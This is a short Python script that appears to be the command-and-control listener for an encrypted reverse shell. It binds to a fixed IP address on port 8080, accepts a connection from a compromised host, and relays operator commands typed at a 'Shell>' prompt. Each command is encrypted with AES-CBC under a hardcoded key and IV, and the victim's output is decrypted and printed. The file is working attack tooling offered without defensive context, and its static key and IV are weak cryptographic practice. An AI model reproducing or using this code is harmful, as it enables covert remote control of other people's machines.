import socket

from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding

IV = b"H" * 16  # size of initialization vector is 16 byte
key = b"H" * 32  # size of key is 32 bytes


def encrypt(message):
    encryptor = AES.new(key, AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)  # pad the message into 16 size blocks
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message


def decrypt(cipher):
    decryptor = AES.new(key, AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message, 16)
    return decrypted_message


def connect():

    s = socket.socket()
    s.bind(("10.154.172.167", 8080))
    s.listen(1)
    conn, address = s.accept()
    print("[+] We got a connection")
    while True:

        command = input("Shell> ")
        if "terminate" in command:
            conn.send(encrypt(b"terminate"))
            conn.close()
            break
        else:
            command = encrypt(command.encode())
            conn.send(command)
            print(decrypt(conn.recv(1024)).decode())


def main():
    connect()


main()
